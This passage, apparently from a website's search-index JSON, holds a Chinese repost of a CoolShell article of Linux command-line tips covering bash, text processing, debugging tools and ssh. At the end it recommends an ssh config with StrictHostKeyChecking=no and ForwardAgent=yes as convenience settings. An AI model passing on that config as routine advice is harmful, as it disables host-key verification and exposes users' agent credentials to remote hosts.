\u6216\u662f\u5176\u5b83\u548c\u5b57\u7b26\u96c6\u76f8\u5173\u7684\u73af\u5883\u53d8\u91cf\u3002\u8fd9\u4e9b\u4e1c\u897f\u53ef\u80fd\u4f1a\u8ba9\u4e00\u4e9b\u547d\u4ee4\uff08\u5982\uff1asort\uff09\u7684\u6267\u884c\u6027\u80fd\u6162N\u591a\u500d\uff08\u6ce8\uff1a\u5c31\u7b97\u662f\u4f60\u7528UTF-8\u7f16\u7801\u6587\u672c\u6587\u4ef6\uff0c\u4f60\u4e5f\u53ef\u4ee5\u5f88\u5b89\u5168\u5730\u4f7f\u7528ASCII\u6765\u5bf9\u5176\u6392\u5e8f\uff09\u3002\u5982\u679c\u4f60\u60f3Disable\u90a3\u4e2ai18n \u5e76\u4f7f\u7528\u4f20\u7edf\u7684\u57fa\u4e8ebyte\u7684\u6392\u5e8f\u65b9\u6cd5\uff0c\u90a3\u5c31\u8bbe\u7f6eexport LC_ALL=C \uff08\u5b9e\u9645\u4e0a\uff0c\u4f60\u53ef\u4ee5\u628a\u5176\u653e\u5728 .bashrc\uff09\u3002\u5982\u679c\u8fd9\u8bbe\u7f6e\u8fd9\u4e2a\u53d8\u91cf\uff0c\u4f60\u7684sort\u547d\u4ee4\u5f88\u6709\u53ef\u80fd\u4f1a\u662f\u9519\u7684\u3002 \u4e86\u89e3 awk \u548c sed\uff0c\u5e76\u7528\u4ed6\u4eec\u6765\u505a\u4e00\u4e9b\u7b80\u5355\u7684\u6570\u636e\u4fee\u6539\u64cd\u4f5c\u3002\u4f8b\u5982\uff1a\u6c42\u7b2c\u4e09\u5217\u7684\u6570\u5b57\u4e4b\u548c\uff1a awk \uff07{ x += $3 } END { print x }\uff07 \u3002\u8fd9\u53ef\u80fd\u4f1a\u6bd4Python\u5feb3\u500d\uff0c\u5e76\u6bd4Python\u7684\u4ee3\u7801\u5c11\u4e09\u500d\u3002 \u4f7f\u7528 shuf \u6765\u6253\u4e71\u4e00\u4e2a\u6587\u4ef6\u4e2d\u7684\u884c\u6216\u662f\u9009\u62e9\u6587\u4ef6\u4e2d\u4e00\u4e2a\u968f\u673a\u7684\u884c\u3002 \u4e86\u89e3sort\u547d\u4ee4\u7684\u9009\u9879\u3002\u4e86\u89e3key\u662f\u4ec0\u4e48\uff08-t\u548c-k\uff09\u3002\u5177\u4f53\u8bf4\u6765\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528-k1,1\u6765\u5bf9\u7b2c\u4e00\u5217\u6392\u5e8f\uff0c-k1\u6765\u5bf9\u5168\u884c\u6392\u5e8f\u3002 Stable sort (sort -s) \u4f1a\u5f88\u6709\u7528\u3002\u4f8b\u5982\uff1a\u5982\u679c\u4f60\u8981\u60f3\u5bf9\u4e24\u4f8b\u6392\u5e8f\uff0c\u5148\u662f\u4ee5\u7b2c\u4e8c\u5217\uff0c\u7136\u540e\u518d\u4ee5\u7b2c\u4e00\u5217\uff0c\u90a3\u4e48\u4f60\u53ef\u4ee5\u8fd9\u6837\uff1a sort -k1,1 | sort -s -k2,2 \u6211\u4eec\u77e5\u9053\uff0c\u5728bash\u547d\u4ee4\u884c\u4e0b\uff0cTab\u952e\u662f\u7528\u6765\u505a\u76ee\u5f55\u6587\u4ef6\u81ea\u52a8\u5b8c\u6210\u7684\u4e8b\u7684\u3002\u4f46\u662f\u5982\u679c\u4f60\u60f3\u8f93\u5165\u4e00\u4e2aTab\u5b57\u7b26\uff08\u6bd4\u5982\uff1a\u4f60\u60f3\u5728sort -t\u9009\u9879\u540e\u8f93\u5165 <tab> \u5b57\u7b26\uff09\uff0c\u4f60\u53ef\u4ee5\u5148\u6309 Ctrl-V \uff0c\u7136\u540e\u518d\u6309Tab\u952e\uff0c\u5c31\u53ef\u4ee5\u8f93\u5165 <tab> \u5b57\u7b26\u4e86\u3002\u5f53\u7136\uff0c\u4f60\u4e5f\u53ef\u4ee5\u4f7f\u7528 $\u2019\\t\u2019 \u3002 \u5982\u679c\u4f60\u60f3\u67e5\u770b\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528hd\u547d\u4ee4\uff08\u5728CentOS\u4e0b\u662fhexdump\u547d\u4ee4\uff09\uff0c\u5982\u679c\u4f60\u60f3\u7f16\u8bd1\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528bvi\u547d\u4ee4\uff08 http://bvi.sourceforge.net/ \u5899\uff09 \u53e6\u5916\uff0c\u5bf9\u4e8e\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528strings\uff08\u914d\u5408grep\u7b49\uff09\u6765\u67e5\u770b\u4e8c\u8fdb\u5236\u4e2d\u7684\u6587\u672c\u3002 \u5bf9\u4e8e\u6587\u672c\u6587\u4ef6\u8f6c\u7801\uff0c\u4f60\u53ef\u4ee5\u8bd5\u4e00\u4e0b iconv\u3002\u6216\u662f\u8bd5\u8bd5\u66f4\u5f3a\u7684 uconv \u547d\u4ee4\uff08\u8fd9\u4e2a\u547d\u4ee4\u652f\u6301\u66f4\u9ad8\u7ea7\u7684Unicode\u7f16\u7801\uff09 \u5982\u679c\u4f60\u8981\u5206\u9694\u4e00\u4e2a\u5927\u6587\u4ef6\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528split\u547d\u4ee4\uff08split by size\uff09\u548ccsplit\u547d\u4ee4\uff08split by a pattern\uff09\u3002 \u7cfb\u7edf\u8c03\u8bd5 \u5982\u679c\u4f60\u60f3\u77e5\u9053\u78c1\u76d8\u3001CPU\u3001\u6216\u7f51\u7edc\u72b6\u6001\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528 iostat, netstat, top (\u6216\u66f4\u597d\u7684 htop), \u8fd8\u6709 dstat \u547d\u4ee4\u3002\u4f60\u53ef\u4ee5\u5f88\u5feb\u5730\u77e5\u9053\u4f60\u7684\u7cfb\u7edf\u53d1\u751f\u4e86\u4ec0\u4e48\u4e8b\u3002\u5173\u4e8e\u8fd9\u65b9\u9762\u7684\u547d\u4ee4\uff0c\u8fd8\u6709iftop, iotop\u7b49\uff08\u53c2\u770b\u300a 28\u4e2aUnix/Linux\u7684\u547d\u4ee4\u884c\u795e\u5668 \u300b\uff09 \u8981\u4e86\u89e3\u5185\u5b58\u7684\u72b6\u6001\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528free\u548cvmstat\u547d\u4ee4\u3002\u5177\u4f53\u6765\u8bf4\uff0c\u4f60\u9700\u8981\u6ce8\u610f \u201ccached\u201d \u7684\u503c\uff0c\u8fd9\u4e2a\u503c\u662fLinux\u5185\u6838\u5360\u7528\u7684\u5185\u5b58\u3002\u8fd8\u6709free\u7684\u503c\u3002 Java \u7cfb\u7edf\u76d1\u63a7\u6709\u4e00\u4e2a\u5c0f\u7684\u6280\u5de7\u662f\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528 kill -3 <pid> \u53d1\u4e00\u4e2aSIGQUIT\u7684\u4fe1\u53f7\u7ed9JVM\uff0c\u53ef\u4ee5\u628a\u5806\u6808\u4fe1\u606f\uff08\u5305\u62ec\u5783\u573e\u56de\u6536\u7684\u4fe1\u606f\uff09dump\u5230stderr/logs\u3002 \u4f7f\u7528 mtr \u4f1a\u6bd4\u4f7f\u7528 traceroute \u8981\u66f4\u5bb9\u6613\u5b9a\u4f4d\u4e00\u4e2a\u7f51\u7edc\u95ee\u9898\u3002 \u5982\u679c\u4f60\u8981\u627e\u5230\u54ea\u4e2asocket\u6216\u8fdb\u7a0b\u5728\u4f7f\u7528\u7f51\u7edc\u5e26\u5bbd\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528 iftop \u6216 nethogs\u3002 Apache\u7684\u4e00\u4e2a\u53eb ab \u7684\u5de5\u5177\u662f\u4e00\u4e2a\u5f88\u6709\u7528\u7684\uff0c\u7528quick-and-dirty\u7684\u65b9\u5f0f\u6765\u6d4b\u8bd5\u7f51\u7ad9\u670d\u52a1\u5668\u7684\u6027\u80fd\u8d1f\u8f7d\u7684\u5de5\u4f5c\u3002\u5982\u679c\u4f60\u9700\u8981\u66f4\u4e3a\u590d\u6742\u7684\u6d4b\u8bd5\uff0c\u4f60\u53ef\u4ee5\u8bd5\u8bd5 siege\u3002 \u5982\u679c\u4f60\u8981\u6293\u7f51\u7edc\u5305\u7684\u8bdd\uff0c\u8bd5\u8bd5 wireshark \u6216 tshark\u3002 \u4e86\u89e3 strace \u548c ltrace\u3002\u8fd9\u4e24\u4e2a\u547d\u4ee4\u53ef\u4ee5\u8ba9\u4f60\u67e5\u770b\u8fdb\u7a0b\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u8fd9\u6709\u52a9\u4e8e\u4f60\u5206\u6790\u8fdb\u7a0b\u7684hang\u5728\u54ea\u4e86\uff0c\u600e\u4e48crash\u548cfailed\u7684\u3002\u4f60\u8fd8\u53ef\u4ee5\u7528\u5176\u6765\u505a\u6027\u80fdprofile\uff0c\u4f7f\u7528 -c \u9009\u9879\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528-p\u9009\u9879\u6765attach\u4e0a\u4efb\u610f\u4e00\u4e2a\u8fdb\u7a0b\u3002 \u4e86\u89e3\u7528ldd\u547d\u4ee4\u6765\u68c0\u67e5\u76f8\u5173\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u3002\u6ce8\u610f\uff1a ldd\u7684\u5b89\u5168\u95ee\u9898 \u4f7f\u7528gdb\u6765\u8c03\u8bd5\u4e00\u4e2a\u6b63\u5728\u8fd0\u884c\u7684\u8fdb\u7a0b\u6216\u5206\u6790core dump\u6587\u4ef6\u3002\u53c2\u770b\u6211\u5199\u7684\u300a GDB\u4e2d\u5e94\u8be5\u77e5\u9053\u7684\u51e0\u4e2a\u8c03\u8bd5\u65b9\u6cd5 \u300b \u5b66\u4f1a\u5230 /proc \u76ee\u5f55\u4e2d\u67e5\u770b\u4fe1\u606f\u3002\u8fd9\u662f\u4e00\u4e2aLinux\u5185\u6838\u8fd0\u884c\u65f6\u8bb0\u5f55\u7684\u6574\u4e2a\u64cd\u4f5c\u7cfb\u7edf\u7684\u8fd0\u884c\u7edf\u8ba1\u548c\u4fe1\u606f\uff0c\u6bd4\u5982\uff1a /proc/cpuinfo, /proc/xxx/cwd, /proc/xxx/exe, /proc/xxx/fd/, /proc/xxx/smaps . \u5982\u679c\u4f60\u8c03\u8bd5\u67d0\u4e2a\u4e1c\u897f\u4e3a\u4ec0\u4e48\u51fa\u9519\u65f6\uff0c sar \u547d\u4ee4\u4f1a\u6709\u7528\u3002\u5b83\u53ef\u4ee5\u8ba9\u4f60\u770b\u770b CPU, \u5185\u5b58, \u7f51\u7edc, \u7b49\u7684\u7edf\u8ba1\u4fe1\u606f\u3002 \u4f7f\u7528 dmesg \u6765\u67e5\u770b\u4e00\u4e9b\u786c\u4ef6\u6216\u9a71\u52a8\u7a0b\u5e8f\u7684\u4fe1\u606f\u6216\u95ee\u9898\u3002 \u4f5c\u8005\u6700\u540e\u52a0\u4e86\u4e00\u4e2a\u514d\u8d23\u58f0\u660e\uff1a Disclaimer: Just because you *can* do something in bash, doesn\u2019t necessarily mean you should. ;) \uff08\u5168\u6587\u5b8c\uff09 \u539f\u6587\u94fe\u63a5\uff1a https://coolshell.cn/articles/8883.html","title":"\u5e94\u8be5\u77e5\u9053\u7684Linux\u6280\u5de7"},{"location":"Bash/%E5%BA%94%E8%AF%A5%E7%9F%A5%E9%81%93%E7%9A%84Linux%E6%8A%80%E5%B7%A7/#linux","text":"\u8fd9\u7bc7\u6587\u7ae0\u6765\u6e90\u4e8eQuroa\u7684\u4e00\u4e2a\u95ee\u7b54\u300a What are some time-saving tips that every Linux user should know? \u300b\u2014\u2014 Linux\u7528\u6237\u6709\u54ea\u4e9b\u5e94\u8be5\u77e5\u9053\u7684\u63d0\u9ad8\u6548\u7387\u7684\u6280\u5de7\u3002\u6211\u89c9\u5f97\u633a\u597d\u7684\uff0c\u603b\u7ed3\u5f97\u6bd4\u8f83\u597d\uff0c\u628a\u5176\u8f6c\u8fc7\u6765\uff0c\u5e76\u52a0\u4e86\u4e00\u4e9b\u81ea\u5df1\u7684\u7406\u89e3\u3002 \u9996\u5148\uff0c\u6211\u60f3\u544a\u8bc9\u5927\u5bb6\uff0c \u5728Unix/Linux\u4e0b\uff0c\u6700\u6709\u6548\u7387\u6280\u5de7\u7684\u4e0d\u662f\u64cd\u4f5c\u56fe\u5f62\u754c\u9762\uff0c\u800c\u662f\u547d\u4ee4\u884c\u64cd\u4f5c\uff0c\u56e0\u4e3a\u547d\u4ee4\u884c\u610f\u5473\u7740\u81ea\u52a8\u5316 \u3002\u5982\u679c\u4f60\u770b\u8fc7\u300a \u4f60\u53ef\u80fd\u4e0d\u77e5\u9053\u7684Shell \u300b\u4ee5\u53ca\u300a 28\u4e2aUnix/Linux\u7684\u547d\u4ee4\u884c\u795e\u5668 \u300b\u4f60\u5c31\u4f1a\u77e5\u9053Linux\u6709\u591a\u5f3a\u5927\uff0c\u8fd9\u4e2a\u5f3a\u5927\u5b8c\u5168\u6765\u81ea\u4e8e\u547d\u4ee4\u884c\uff0c\u4e8e\u662f\uff0c\u5c31\u7b97\u4f60\u4e0d\u77e5\u9053\u600e\u4e48\u53bb \u505a\u4e00\u4e2a\u73af\u4fdd\u4e3b\u4e49\u7684\u7a0b\u5e8f\u5458 \uff0c\u81f3\u5c11\u4ed6\u4eec\u53ef\u4ee5\u8ba9\u4f60\u5c11\u71ac\u70b9\u591c\uff0c\u4ece\u800c\u6709\u5229\u4e8e\u4f60\u7684\u8eab\u4f53\u5065\u5eb7\u548c\u6027\u751f\u6d3b\u3002\u4e0b\u9762\u662f\u4e00\u4e2a\u6709\u70b9\u957f\u7684\u5217\u8868\uff0c\u6b63\u5982\u4f5c\u8005\u6240\u8bf4\uff0c\u4f60\u5e76\u4e0d\u9700\u8981\u77e5\u9053\u6240\u6709\u7684\u8fd9\u4e9b\u4e1c\u897f\uff0c\u4f46\u662f\u5982\u679c\u4f60\u8fd8\u5728\u5f88\u6c89\u91cd\u5730\u5728\u4f7f\u7528Linux\u7684\u8bdd\uff0c\u8fd9\u4e9b\u4e1c\u897f\u90fd\u503c\u5f97\u4f60\u770b\u4e00\u770b\u3002 \uff08\u6ce8\uff1a\u5982\u679c\u4f60\u60f3\u77e5\u9053\u4e0b\u9762\u6d89\u53ca\u5230\u7684\u547d\u4ee4\u7684\u66f4\u591a\u7684\u7528\u6cd5\uff0c\u4f60\u4e00\u5b9a\u8981man\u4e00\u70b9\u3002\u5bf9\u4e8e\u4e00\u4e9b\u547d\u4ee4\uff0c\u4f60\u53ef\u4ee5\u9700\u8981\u5148yum\u6216apt-get\u6765\u5b89\u88c5\u4e00\u4e0b\uff0c\u5982\u679c\u6709\u4ec0\u4e48\u95ee\u9898\uff0c\u522b\u5fd8\u4e86Google\u3002\u5982\u679c\u4f60\u8981Baidu\u7684\u8bdd\uff0c\u6211\u4ec5\u4ee3\u8868\u8fd9\u4e2a\u5730\u7403\u4e0a\u6240\u6709\u7684\u751f\u7269\u5305\u62ec\u5fae\u751f\u7269\u751a\u81f3\u7ec6\u83cc\u75c5\u6bd2\u548c\u5c0f\u5f3aBS\u4f60\u5230\u5b87\u5b99\u6bc1\u706d\uff09","title":"\u5e94\u8be5\u77e5\u9053\u7684Linux\u6280\u5de7"},{"location":"Bash/%E5%BA%94%E8%AF%A5%E7%9F%A5%E9%81%93%E7%9A%84Linux%E6%8A%80%E5%B7%A7/#_1","text":"\u5b66\u4e60 Bash \u3002\u4f60\u53ef\u4ee5man bash\u6765\u770b\u770bbash\u7684\u4e1c\u897f\uff0c\u5e76\u4e0d\u590d\u6742\u4e5f\u5e76\u4e0d\u957f\u3002\u4f60\u7528\u522b\u7684shell\u4e5f\u884c\uff0c\u4f46\u662fbash\u662f\u5f88\u5f3a\u5927\u7684\u5e76\u4e14\u4e5f\u662f\u7cfb\u7edf\u9ed8\u8ba4\u7684\u3002\uff08\u5b66\u4e60zsh\u6216tsch\u53ea\u4f1a\u8ba9\u4f60\u5728\u5f88\u591a\u60c5\u51b5\u4e0b\u53d7\u5230\u9650\u5236\uff09 \u5b66\u4e60 vim \u3002\u5728Linux\u4e0b\uff0c\u57fa\u672c\u6ca1\u6709\u4ec0\u4e48\u53ef\u4e0e\u4e4b\u7ade\u4e89\u7684\u7f16~~\u8bd1~~\u8f91\u5668\uff08\u5c31\u7b97\u4f60\u662f\u4e00\u4e2aEmacs\u6216Eclipse\u7684\u91cd\u5ea6\u7528\u6237\uff09\u3002\u4f60\u53ef\u4ee5\u770b\u770b\u300a \u7b80\u660evim\u653b\u7565 \u300b\u548c \u300a Vim\u7684\u5192\u9669\u6e38\u620f \u300b\u4ee5\u53ca\u300a \u7ed9\u7a0b\u5e8f\u5458\u7684Vim\u901f\u67e5\u5361 \u300b\u8fd8\u6709\u300a \u628aVim\u53d8\u6210\u4e00\u4e2a\u7f16\u7a0b\u7684IDE \u300b\u7b49\u7b49\u3002 \u4e86\u89e3 ssh \u3002\u660e\u767d\u4e0d\u9700\u8981\u53e3\u4ee4\u7684\u7528\u6237\u8ba4\u8bc1\uff08\u901a\u8fc7 ssh-agent , ssh-add \uff09\uff0c\u5b66\u4f1a\u7528ssh\u7ffb\u5899\uff0c\u7528scp\u800c\u4e0d\u662fftp\u4f20\u6587\u4ef6\uff0c\u7b49\u7b49\u3002\u4f60\u77e5\u9053\u5417\uff1fscp \u8fdc\u7aef\u7684\u65f6\u5019\uff0c\u4f60\u53ef\u4ee5\u6309tab\u952e\u6765\u67e5\u770b\u8fdc\u7aef\u7684\u76ee\u5f55\u548c\u6587\u4ef6\uff08\u5f53\u7136\uff0c\u9700\u8981\u65e0\u53e3\u4ee4\u7684\u7528\u6237\u8ba4\u8bc1\uff09\uff0c\u8fd9\u90fd\u662fbash\u7684\u529f\u52b3\u3002 \u719f\u6089bash\u7684\u4f5c\u4e1a\u7ba1\u7406 \uff0c\u5982\uff1a &, Ctrl-Z, Ctrl-C, jobs, fg, bg, kill , \u7b49\u7b49\u3002\u5f53\u7136\uff0c\u4f60\u4e5f\u8981\u77e5\u9053 Ctrl+\\\uff08SIGQUIT\uff09 \u548c Ctrl+C \uff08SIGINT\uff09 \u7684\u533a\u522b\u3002 \u7b80\u5355\u7684\u6587\u4ef6\u7ba1\u7406 \uff1a ls \u548c ls -l (\u4f60\u6700\u597d\u77e5\u9053 \u201cls -l\u201d \u7684\u6bcf\u4e00\u5217\u7684\u610f\u601d), less, head, tail \u548c tail -f, ln \u548c ln -s (\u4f60\u77e5\u9053\u660e\u767dhard link\u548csoft link\u7684\u4e0d\u540c\u548c\u4f18\u7f3a\u70b9), chown , chmod , du (\u5982\u679c\u4f60\u60f3\u770b\u770b\u78c1\u76d8\u7684\u5927\u5c0f du -sk * ), df , mount \u3002\u5f53\u7136\uff0c\u539f\u4f5c\u8005\u5fd8\u4e86 find \u547d\u4ee4\u3002 \u57fa\u7840\u7684\u7f51\u7edc\u7ba1\u7406 \uff1a ip \u6216 ifconfig, dig\u3002\u5f53\u7136\uff0c\u539f\u4f5c\u8005\u8fd8\u5fd8\u4e86\u5982netstat, ping, traceroute, \u7b49 \u7406\u89e3\u6b63\u5219\u8868\u8fbe\u5f0f \uff0c\u8fd8\u6709grep/egrep\u7684\u5404\u79cd\u9009\u9879\u3002\u6bd4\u5982\uff1a -o, -A, \u548c -B \u8fd9\u4e9b\u9009\u9879\u662f\u5f88\u503c\u5f97\u4e86\u89e3\u7684\u3002 \u5b66\u4e60\u4f7f\u7528 apt-get \u548c yum \u6765\u67e5\u627e\u548c\u5b89\u88c5\u8f6f\u4ef6 \uff08\u524d\u8005\u7684\u7ecf\u5178\u5206\u53d1\u5305\u662fUbuntu\uff0c\u540e\u8005\u7684\u7ecf\u5178\u5206\u53d1\u5305\u662fRedhat\uff09\uff0c\u6211\u8fd8\u5efa\u8bae\u4f60\u8bd5\u7740\u4ece\u6e90\u7801\u7f16\u8bd1\u5b89\u88c5\u8f6f\u4ef6\u3002","title":"\u57fa\u7840"},{"location":"Bash/%E5%BA%94%E8%AF%A5%E7%9F%A5%E9%81%93%E7%9A%84Linux%E6%8A%80%E5%B7%A7/#_2","text":"\u5728 bash \u91cc\uff0c\u4f7f\u7528 Ctrl-R \u800c\u4e0d\u662f\u4e0a\u4e0b\u5149\u6807\u952e\u6765\u67e5\u627e\u5386\u53f2\u547d\u4ee4\u3002 \u5728 bash\u91cc\uff0c\u4f7f\u7528 Ctrl-W \u6765\u5220\u9664\u6700\u540e\u4e00\u4e2a\u5355\u8bcd\uff0c\u4f7f\u7528 Ctrl-U \u6765\u5220\u9664\u4e00\u884c\u3002\u8bf7man bash\u540e\u67e5\u627eReadline Key Bindings\u4e00\u8282\u6765\u770b\u770bbash\u7684\u9ed8\u8ba4\u70ed\u952e\uff0c\u6bd4\u5982\uff1aAlt-. \u628a\u4e0a\u4e00\u6b21\u547d\u4ee4\u7684\u6700\u540e\u4e00\u4e2a\u53c2\u6570\u6253\u51fa\u6765\uff0c\u800cAlt-* \u5219\u5217\u51fa\u4f60\u53ef\u4ee5\u8f93\u5165\u7684\u547d\u4ee4\u3002 \u56de\u5230\u4e0a\u4e00\u6b21\u7684\u5de5\u4f5c\u76ee\u5f55\uff1a cd \u2013 \uff08\u56de\u5230home\u662f cd ~ \uff09 \u4f7f\u7528 xargs\u3002\u8fd9\u662f\u4e00\u4e2a\u5f88\u5f3a\u5927\u7684\u547d\u4ee4\u3002\u4f60\u53ef\u4ee5\u4f7f\u7528-L\u6765\u9650\u5b9a\u6709\u591a\u5c11\u4e2a\u547d\u4ee4\uff0c\u4e5f\u53ef\u4ee5\u7528-P\u6765\u6307\u5b9a\u5e76\u884c\u7684\u8fdb\u7a0b\u6570\u3002\u5982\u679c\u4f60\u4e0d\u77e5\u9053\u4f60\u7684\u547d\u4ee4\u4f1a\u53d8\u6210\u4ec0\u4e48\u6837\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528xargs echo\u6765\u770b\u770b\u4f1a\u662f\u4ec0\u4e48\u6837\u3002\u5f53\u7136\uff0c -I{} \u4e5f\u5f88\u597d\u7528\u3002\u793a\u4f8b\uff1a find . -name \\*.py | xargs grep some_function cat hosts | xargs -I{} ssh root@{} hostname pstree -p \u53ef\u4ee5\u5e2e\u4f60\u663e\u793a\u8fdb\u7a0b\u6811\u3002\uff08\u8bfb\u8fc7\u6211\u7684\u90a3\u7bc7\u300a \u4e00\u4e2afork\u7684\u9762\u8bd5\u9898 \u300b\u7684\u4eba\u5e94\u8be5\u90fd\u4e0d\u964c\u751f\uff09 \u4f7f\u7528 pgrep \u548c pkill \u6765\u627e\u5230\u6216\u662fkill \u67d0\u4e2a\u540d\u5b57\u7684\u8fdb\u7a0b\u3002 (-f \u9009\u9879\u5f88\u6709\u7528). \u4e86\u89e3\u53ef\u4ee5\u53d1\u7ed9\u8fdb\u7a0b\u7684\u4fe1\u53f7\u3002\u4f8b\u5982\uff1a\u8981\u6302\u8d77\u4e00\u4e2a\u8fdb\u7a0b\uff0c\u4f7f\u7528 kill -STOP [pid]. \u4f7f\u7528 man 7 signal \u6765\u67e5\u770b\u5404\u79cd\u4fe1\u53f7\uff0c\u4f7f\u7528kill -l \u6765\u67e5\u770b\u6570\u5b57\u548c\u4fe1\u53f7\u7684\u5bf9\u5e94\u8868 \u4f7f\u7528 nohup \u6216 disown \u5982\u679c\u4f60\u8981\u8ba9\u67d0\u4e2a\u8fdb\u7a0b\u8fd0\u884c\u5728\u540e\u53f0\u3002 \u4f7f\u7528netstat -lntp\u6765\u770b\u770b\u6709\u4fa6\u542c\u5728\u7f51\u7edc\u67d0\u7aef\u53e3\u7684\u8fdb\u7a0b\u3002\u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 lsof\u3002 \u5728bash\u7684\u811a\u672c\u4e2d\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528 set -x \u6765debug\u8f93\u51fa\u3002\u4f7f\u7528 set -e \u6765\u5f53\u6709\u9519\u8bef\u53d1\u751f\u7684\u65f6\u5019abort\u6267\u884c\u3002\u8003\u8651\u4f7f\u7528 set -o pipefail \u6765\u9650\u5236\u9519\u8bef\u3002\u8fd8\u53ef\u4ee5\u4f7f\u7528trap\u6765\u622a\u83b7\u4fe1\u53f7\uff08\u5982\u622a\u83b7ctrl+c\uff09\u3002 \u5728bash \u811a\u672c\u4e2d\uff0csubshells (\u5199\u5728\u5706\u62ec\u53f7\u91cc\u7684) \u662f\u4e00\u4e2a\u5f88\u65b9\u4fbf\u7684\u65b9\u5f0f\u6765\u7ec4\u5408\u4e00\u4e9b\u547d\u4ee4\u3002\u4e00\u4e2a\u5e38\u7528\u7684\u4f8b\u5b50\u662f\u4e34\u65f6\u5730\u5230\u53e6\u4e00\u4e2a\u76ee\u5f55\u4e2d\uff0c\u4f8b\u5982\uff1a # do something in current dir (cd /some/other/dir; other-command) # continue in original dir \u5728 bash \u4e2d\uff0c\u6ce8\u610f\u90a3\u91cc\u6709\u5f88\u591a\u7684\u53d8\u91cf\u5c55\u5f00\u3002\u5982\uff1a\u68c0\u67e5\u4e00\u4e2a\u53d8\u91cf\u662f\u5426\u5b58\u5728: ${name:?error message} \u3002\u5982\u679c\u4e00\u4e2abash\u7684\u811a\u672c\u9700\u8981\u4e00\u4e2a\u53c2\u6570\uff0c\u4e5f\u8bb8\u5c31\u662f\u8fd9\u6837\u4e00\u4e2a\u8868\u8fbe\u5f0f input_file=${1:?usage: $0 input_file} \u3002\u4e00\u4e2a\u8ba1\u7b97\u8868\u8fbe\u5f0f\uff1a i=$(( (i + 1) % 5 )) \u3002\u4e00\u4e2a\u5e8f\u5217\uff1a {1..10}\u3002 \u622a\u65ad\u4e00\u4e2a\u5b57\u7b26\u4e32\uff1a ${var%suffix} \u548c ${var#prefix} \u3002 \u793a\u4f8b\uff1a if var=foo.pdf, then echo ${var%.pdf}.txt prints \u201cfoo.txt\u201d . \u901a\u8fc7 <(some command) \u53ef\u4ee5\u628a\u67d0\u547d\u4ee4\u5f53\u6210\u4e00\u4e2a\u6587\u4ef6\u3002\u793a\u4f8b\uff1a\u6bd4\u8f83\u4e00\u4e2a\u672c\u5730\u6587\u4ef6\u548c\u8fdc\u7a0b\u6587\u4ef6 /etc/hosts\uff1a diff /etc/hosts <(ssh somehost cat /etc/hosts) \u4e86\u89e3\u4ec0\u4e48\u53eb \u201c here documents \u201d \uff0c\u5c31\u662f\u8bf8\u5982 cat <<EOF \u8fd9\u6837\u7684\u4e1c\u897f\u3002 \u5728 bash\u4e2d\uff0c\u4f7f\u7528\u91cd\u5b9a\u5411\u5230\u6807\u51c6\u8f93\u51fa\u548c\u6807\u51c6\u9519\u8bef\u3002\u5982\uff1a some-command >logfile 2>&1 \u3002\u53e6\u5916\uff0c\u8981\u786e\u8ba4\u67d0\u547d\u4ee4\u6ca1\u6709\u628a\u67d0\u4e2a\u6253\u5f00\u4e86\u7684\u6587\u4ef6\u53e5\u67c4\u91cd\u5b9a\u5411\u7ed9\u6807\u51c6\u8f93\u5165\uff0c\u6700\u4f73\u5b9e\u8df5\u662f\u52a0\u4e0a \u201c</dev/null\u201d \uff0c\u628a /dev/null \u91cd\u5b9a\u5411\u5230\u6807\u51c6\u8f93\u5165\u3002 \u4f7f\u7528 man ascii \u6765\u67e5\u770b ASCII \u8868\u3002 \u5728\u8fdc\u7aef\u7684 ssh \u4f1a\u8bdd\u91cc\uff0c\u4f7f\u7528 screen \u6216 dtach \u6765\u4fdd\u5b58\u4f60\u7684\u4f1a\u8bdd\u3002\uff08\u53c2\u770b\u300a 28\u4e2aUnix/Linux\u7684\u547d\u4ee4\u884c\u795e\u5668 \u300b\uff09 \u8981\u6765debug Web\uff0c\u8bd5\u8bd5curl \u548c curl -I \u6216\u662f wget \u3002\u6211\u89c9\u5f97debug Web\u7684\u5229\u5668\u662ffirebug\uff0ccurl\u548cwget\u662f\u7528\u6765\u6293\u7f51\u9875\u7684\uff0c\u5475\u5475\u3002 \u628a HTML \u8f6c\u6210\u6587\u672c\uff1a lynx -dump -stdin \u5982\u679c\u4f60\u8981\u5904\u7406XML\uff0c\u4f7f\u7528 xmlstarlet \u5bf9\u4e8e Amazon S3\uff0c s3cmd \u662f\u4e00\u4e2a\u5f88\u65b9\u4fbf\u7684\u547d\u4ee4\uff08\u8fd8\u6709\u70b9\u4e0d\u6210\u719f\uff09 \u5728 ssh\u4e2d\uff0c\u77e5\u9053\u600e\u4e48\u6765\u4f7f\u7528ssh\u96a7\u9053\u3002\u901a\u8fc7 -L or -D (\u8fd8\u6709-R) \uff0c\u7ffb\u5899\u795e\u5668\u3002 \u4f60\u8fd8\u53ef\u4ee5\u5bf9\u4f60\u7684ssh \u505a\u70b9\u4f18\u5316\u3002\u6bd4\u5982\uff0c .ssh/config \u5305\u542b\u7740\u4e00\u4e9b\u914d\u7f6e\uff1a\u907f\u514d\u94fe\u63a5\u88ab\u4e22\u5f03\uff0c\u94fe\u63a5\u65b0\u7684host\u65f6\u4e0d\u9700\u8981\u786e\u8ba4\uff0c\u8f6c\u53d1\u8ba4\u8bc1\uff0c\u4ee5\u524d\u4f7f\u7528\u538b\u7f29\uff08\u5982\u679c\u4f60\u8981\u4f7f\u7528scp\u4f20\u6587\u4ef6\uff09\uff1a TCPKeepAlive=yes ServerAliveInterval=15 ServerAliveCountMax=6 StrictHostKeyChecking=no Compression=yes ForwardAgent=yes 